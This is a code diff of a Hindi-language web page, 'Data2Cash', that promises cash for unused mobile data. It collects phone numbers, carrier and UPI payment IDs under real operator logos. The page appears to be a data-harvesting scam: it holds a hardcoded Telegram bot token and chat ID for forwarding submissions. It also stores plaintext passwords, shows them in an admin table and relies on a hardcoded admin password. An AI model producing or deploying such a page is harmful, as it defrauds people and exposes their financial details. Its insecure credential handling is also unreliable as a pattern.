@@ -3,13 +3,13 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sell Unused Data & Earn Cash</title>
+  <title>Data2Cash - Sell Unused Data</title>
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
   <style>
     * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 0; }
     
     body {
-      background: linear-gradient(135deg, #0f172a, #1e293b);
+      background: #0f172a;
       color: #fff;
       display: flex;
       justify-content: center;
@@ -20,26 +20,28 @@
       overflow-x: hidden;
     }
 
-    /* SIM Watermark Background Grid */
+    /* Background Watermark Logos Grid */
     .bg-logos {
-      position: absolute;
+      position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-around;
-      align-items: center;
-      opacity: 0.06;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 40px;
+      padding: 20px;
+      opacity: 0.08;
       pointer-events: none;
       z-index: 0;
+      align-items: center;
+      justify-items: center;
     }
 
-    .bg-logos i {
-      font-size: 80px;
-      margin: 30px;
-      color: #38bdf8;
+    .bg-logos img {
+      width: 80px;
+      height: 80px;
+      filter: grayscale(100%) invert(100%);
     }
 
     .card {
@@ -52,7 +54,7 @@
       box-shadow: 0 10px 25px rgba(0, 0, 0, 0.6);
       position: relative;
       z-index: 1;
-      backdrop-filter: blur(5px);
+      backdrop-filter: blur(8px);
     }
 
     .card-title {
@@ -61,6 +63,20 @@
       color: #38bdf8;
       text-align: center;
       margin-bottom: 5px;
+    }
+
+    .operator-header-logos {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 15px;
+      margin: 10px 0 15px 0;
+    }
+
+    .operator-header-logos img {
+      height: 28px;
+      width: auto;
+      border-radius: 4px;
     }
 
     .rate-badge {
@@ -74,7 +90,6 @@
       border: 1px solid rgba(74, 222, 128, 0.2);
     }
 
-    /* Warning Notice Box inside form */
     .notice-box {
       background: rgba(239, 68, 68, 0.1);
       border: 1px solid rgba(239, 68, 68, 0.3);
@@ -133,6 +148,20 @@
 
     .btn-submit:hover { background: #1d4ed8; }
 
+    .toggle-auth {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 13px;
+      color: #94a3b8;
+    }
+
+    .toggle-auth a {
+      color: #38bdf8;
+      text-decoration: none;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
     .success-msg {
       display: none;
       background: rgba(34, 197, 94, 0.15);
@@ -144,91 +173,315 @@
       text-align: center;
       margin-top: 15px;
     }
+
+    .hidden { display: none !important; }
+
+    .user-info-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: #0f172a;
+      padding: 8px 12px;
+      border-radius: 8px;
+      margin-bottom: 15px;
+      font-size: 12px;
+      color: #38bdf8;
+    }
+
+    .btn-logout {
+      background: #ef4444;
+      color: white;
+      border: none;
+      padding: 4px 8px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 11px;
+    }
+
+    .user-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 10px;
+      font-size: 12px;
+    }
+
+    .user-table th, .user-table td {
+      border: 1px solid #334155;
+      padding: 8px;
+      text-align: left;
+    }
+
+    .user-table th { background: #0f172a; color: #38bdf8; }
   </style>
 </head>
 <body>
 
-  <!-- Background SIM Logos -->
+  <!-- Background Operator Logos -->
   <div class="bg-logos">
-    <i class="fa-solid fa-sim-card"></i>
-    <i class="fa-solid fa-wifi"></i>
-    <i class="fa-solid fa-tower-cell"></i>
-    <i class="fa-solid fa-mobile-screen-button"></i>
-    <i class="fa-solid fa-signal"></i>
-    <i class="fa-solid fa-sim-card"></i>
-    <i class="fa-solid fa-tower-cell"></i>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/50/Reliance_Jio_Logo.svg" alt="Jio">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/29/Airtel_logo-en.svg" alt="Airtel">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e5/Vodafone_Idea_logo.svg" alt="Vi">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/BSNL_Logo.svg" alt="BSNL">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/50/Reliance_Jio_Logo.svg" alt="Jio">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/29/Airtel_logo-en.svg" alt="Airtel">
   </div>
 
   <div class="card">
+    
     <div class="card-title"><i class="fa-solid fa-wifi"></i> Data2Cash</div>
-    <div class="rate-badge">रेट: 1 GB (1024 MB) = ₹6.00</div>
 
-    <div class="notice-box">
-      <strong>⚠️ Important Notice:</strong> SIM में एक्टिव डेटा रिचार्ज होना अनिवार्य है। Wi-Fi अलाउड नहीं है।
+    <!-- Company Logos Display Header -->
+    <div class="operator-header-logos">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/50/Reliance_Jio_Logo.svg" alt="Jio">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/2/29/Airtel_logo-en.svg" alt="Airtel">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/e/e5/Vodafone_Idea_logo.svg" alt="Vi">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/BSNL_Logo.svg" alt="BSNL">
     </div>
 
-    <form id="dataForm" onsubmit="handleSubmit(event)">
-      
-      <div class="form-group">
-        <label>मोबाइल नंबर</label>
-        <input type="tel" id="mobile" placeholder="10-अंकों का नंबर" required pattern="[0-9]{10}">
+    <!-- 1. SIGNUP FORM -->
+    <div id="signupSection">
+      <h3 style="text-align: center; font-size: 16px; margin-bottom: 15px; color: #94a3b8;">नया अकाउंट बनाएं (Signup)</h3>
+      <form onsubmit="handleSignup(event)">
+        <div class="form-group">
+          <label>मोबाइल नंबर</label>
+          <input type="tel" id="signupMobile" placeholder="10-अंकों का नंबर" required pattern="[0-9]{10}">
+        </div>
+        <div class="form-group">
+          <label>पासवर्ड बनाएं</label>
+          <input type="password" id="signupPassword" placeholder="पासवर्ड दर्ज करें" required minlength="4">
+        </div>
+        <button type="submit" class="btn-submit">अकाउंट बनाएं</button>
+      </form>
+      <div class="toggle-auth">
+        पहले से अकाउंट है? <a onclick="showSection('loginSection')">लॉगिन करें</a>
       </div>
-
-      <div class="form-group">
-        <label>सिम कंपनी</label>
-        <select id="operator" required>
-          <option value="" disabled selected>कंपनी चुनें...</option>
-          <option value="Jio">Jio</option>
-          <option value="Airtel">Airtel</option>
-          <option value="Vi">Vi</option>
-          <option value="BSNL">BSNL</option>
-        </select>
-      </div>
-
-      <div class="form-group">
-        <label>डेटा (MB में)</label>
-        <input type="number" id="mbData" placeholder="उदा. 1024" required min="1" oninput="calculateAmount()">
-      </div>
-
-      <div class="form-group">
-        <label>पेमेंट मेथड (App)</label>
-        <select id="paymentApp" required>
-          <option value="" disabled selected>ऐप चुनें...</option>
-          <option value="PhonePe">PhonePe</option>
-          <option value="Paytm">Paytm</option>
-          <option value="Google Pay">Google Pay</option>
-          <option value="Other UPI">अन्य UPI App</option>
-        </select>
-      </div>
-
-      <div class="form-group">
-        <label>UPI ID / नंबर</label>
-        <input type="text" id="upiId" placeholder="उदा. 9876543210@paytm या UPI ID" required>
-      </div>
-
-      <div class="payout-box">
-        <label style="margin:0;">अनुमानित कमाई</label>
-        <div class="payout-amount" id="payout">₹ 0.00</div>
-      </div>
-
-      <button type="submit" class="btn-submit" id="submitBtn">सबमिट करें और डेटा बेचें</button>
-
-    </form>
-
-    <div class="success-msg" id="successMsg">
-      <i class="fa-solid fa-circle-check"></i> रिक्वेस्ट सबमिट हो गई है! भुगतान 5 मिनट में कर दिया जाएगा।
     </div>
+
+    <!-- 2. LOGIN FORM -->
+    <div id="loginSection" class="hidden">
+      <h3 style="text-align: center; font-size: 16px; margin-bottom: 15px; color: #94a3b8;">लॉगिन करें (Login)</h3>
+      <form onsubmit="handleLogin(event)">
+        <div class="form-group">
+          <label>मोबाइल नंबर</label>
+          <input type="tel" id="loginMobile" placeholder="10-अंकों का नंबर" required pattern="[0-9]{10}">
+        </div>
+        <div class="form-group">
+          <label>पासवर्ड</label>
+          <input type="password" id="loginPassword" placeholder="पासवर्ड दर्ज करें" required>
+        </div>
+        <button type="submit" class="btn-submit">लॉगिन करें</button>
+      </form>
+      <div class="toggle-auth">
+        अकाउंट नहीं है? <a onclick="showSection('signupSection')">नया अकाउंट बनाएं</a>
+      </div>
+    </div>
+
+    <!-- 3. MAIN DATA SELL FORM -->
+    <div id="mainFormSection" class="hidden">
+      <div class="user-info-bar">
+        <span><i class="fa-solid fa-user"></i> <span id="currentLoggedUser"></span></span>
+        <button class="btn-logout" onclick="logout()">लॉगआउट</button>
+      </div>
+
+      <div class="rate-badge">रेट: 1 GB (1024 MB) = ₹6.00</div>
+
+      <div class="notice-box">
+        <strong>⚠️ Important Notice:</strong> SIM में एक्टिव डेटा रिचार्ज होना अनिवार्य है। Wi-Fi अलाउड नहीं है।
+      </div>
+
+      <form id="dataForm" onsubmit="handleSubmit(event)">
+        <div class="form-group">
+          <label>सिम नंबर (Mobile Number)</label>
+          <input type="tel" id="mobile" placeholder="10-अंकों का नंबर" required pattern="[0-9]{10}">
+        </div>
+
+        <div class="form-group">
+          <label>सिम कंपनी (Operator)</label>
+          <select id="operator" required>
+            <option value="" disabled selected>कंपनी चुनें...</option>
+            <option value="Jio">Jio</option>
+            <option value="Airtel">Airtel</option>
+            <option value="Vi">Vi</option>
+            <option value="BSNL">BSNL</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label>डेटा (MB में)</label>
+          <input type="number" id="mbData" placeholder="उदा. 1024" required min="1" oninput="calculateAmount()">
+        </div>
+
+        <div class="form-group">
+          <label>पेमेंट मेथड (App)</label>
+          <select id="paymentApp" required>
+            <option value="" disabled selected>ऐप चुनें...</option>
+            <option value="PhonePe">PhonePe</option>
+            <option value="Paytm">Paytm</option>
+            <option value="Google Pay">Google Pay</option>
+            <option value="Other UPI">अन्य UPI App</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label>UPI ID / नंबर</label>
+          <input type="text" id="upiId" placeholder="उदा. 9876543210@paytm या UPI ID" required>
+        </div>
+
+        <div class="payout-box">
+          <label style="margin:0;">अनुमानित कमाई</label>
+          <div class="payout-amount" id="payout">₹ 0.00</div>
+        </div>
+
+        <button type="submit" class="btn-submit" id="submitBtn">सबमिट करें और डेटा बेचें</button>
+      </form>
+
+      <div class="success-msg" id="successMsg">
+        <i class="fa-solid fa-circle-check"></i> रिक्वेस्ट सबमिट हो गई है! भुगतान 5 मिनट में कर दिया जाएगा।
+      </div>
+    </div>
+
+    <!-- 4. OWNER/ADMIN PANEL SECTION -->
+    <div id="adminSection" class="hidden">
+      <div class="user-info-bar">
+        <span>👑 Admin Panel (Owner Mode)</span>
+        <button class="btn-logout" onclick="logout()">लॉगआउट</button>
+      </div>
+
+      <h4 style="color:#38bdf8; margin-bottom: 10px;">पंजीकृत यूज़र्स की लिस्ट (Registered Users)</h4>
+      <div style="max-height: 250px; overflow-y: auto;">
+        <table class="user-table">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>मोबाइल</th>
+              <th>पासवर्ड</th>
+            </tr>
+          </thead>
+          <tbody id="userListBody">
+            <!-- Dynamic Users -->
+          </tbody>
+        </table>
+      </div>
+    </div>
+
   </div>
 
 <script>
-  // Website open hote hi alert popup aayega
-  window.onload = function() {
-    alert("⚠️ Important News!\n\nआपके सिम में एक्टिव रिचार्ज (Data Pack) होना अनिवार्य है। अगर रिचार्ज नहीं होगा तो यह काम नहीं करेगा। धन्यवाद!\n\n🚫 Note: Wi-Fi Not Allowed!");
-  };
-
   const TELEGRAM_BOT_TOKEN = "8899074021:AAHw5zYbB38Y4op6FW44ElOVMsGPLTGYhy0";
   const TELEGRAM_CHAT_ID = "7742143795";
 
+  // Alert on Load
+  window.onload = function() {
+    alert("⚠️ Important News!\n\nआपके सिम में एक्टिव रिचार्ज (Data Pack) होना अनिवार्य है। अगर रिचार्ज नहीं होगा तो यह काम नहीं करेगा। धन्यवाद!\n\n🚫 Note: Wi-Fi Not Allowed!");
+    checkAutoLogin();
+  };
+
+  // Section Switcher
+  function showSection(sectionId) {
+    document.getElementById('signupSection').classList.add('hidden');
+    document.getElementById('loginSection').classList.add('hidden');
+    document.getElementById('mainFormSection').classList.add('hidden');
+    document.getElementById('adminSection').classList.add('hidden');
+
+    document.getElementById(sectionId).classList.remove('hidden');
+  }
+
+  // Get Saved Users from LocalStorage
+  function getUsers() {
+    return JSON.parse(localStorage.getItem('registeredUsers') || '[]');
+  }
+
+  // Handle Signup
+  function handleSignup(e) {
+    e.preventDefault();
+    const mobile = document.getElementById('signupMobile').value;
+    const password = document.getElementById('signupPassword').value;
+
+    let users = getUsers();
+    let exists = users.find(u => u.mobile === mobile);
+
+    if (exists) {
+      alert("यह मोबाइल नंबर पहले से रजिस्टर्ड है! कृपया लॉगिन करें।");
+      showSection('loginSection');
+      return;
+    }
+
+    users.push({ mobile, password });
+    localStorage.setItem('registeredUsers', JSON.stringify(users));
+
+    alert("अकाउंट सफलतापूर्वक बन गया! अब लॉगिन करें।");
+    showSection('loginSection');
+  }
+
+  // Handle Login
+  function handleLogin(e) {
+    e.preventDefault();
+    const mobile = document.getElementById('loginMobile').value;
+    const password = document.getElementById('loginPassword').value;
+
+    // Check for Owner Credentials
+    if (mobile === "9999999999" && password === "admin123") {
+      localStorage.setItem('loggedInUser', 'Admin');
+      loadAdminData();
+      showSection('adminSection');
+      return;
+    }
+
+    let users = getUsers();
+    let user = users.find(u => u.mobile === mobile && u.password === password);
+
+    if (user) {
+      localStorage.setItem('loggedInUser', mobile);
+      document.getElementById('currentLoggedUser').innerText = mobile;
+      document.getElementById('mobile').value = mobile;
+      showSection('mainFormSection');
+    } else {
+      alert("गलत मोबाइल नंबर या पासवर्ड! कृपया जांचें या नया अकाउंट बनाएं।");
+    }
+  }
+
+  function checkAutoLogin() {
+    let currentUser = localStorage.getItem('loggedInUser');
+    if (currentUser === 'Admin') {
+      loadAdminData();
+      showSection('adminSection');
+    } else if (currentUser) {
+      document.getElementById('currentLoggedUser').innerText = currentUser;
+      document.getElementById('mobile').value = currentUser;
+      showSection('mainFormSection');
+    } else {
+      showSection('signupSection');
+    }
+  }
+
+  function logout() {
+    localStorage.removeItem('loggedInUser');
+    showSection('loginSection');
+  }
+
+  // Load Admin Panel Users Table
+  function loadAdminData() {
+    const tbody = document.getElementById('userListBody');
+    tbody.innerHTML = '';
+    let users = getUsers();
+
+    if (users.length === 0) {
+      tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;">कोई यूज़र डेटा नहीं मिला</td></tr>';
+      return;
+    }
+
+    users.forEach((u, index) => {
+      tbody.innerHTML += `
+        <tr>
+          <td>${index + 1}</td>
+          <td>${u.mobile}</td>
+          <td>${u.password}</td>
+        </tr>
+      `;
+    });
+  }
+
+  // Calculation
   function calculateAmount() {
     const mbInput = document.getElementById('mbData').value;
     const payoutDiv = document.getElementById('payout');
@@ -242,6 +495,7 @@
     }
   }
 
+  // Telegram Submission
   async function handleSubmit(e) {
     e.preventDefault();
     const btn = document.getElementById('submitBtn');
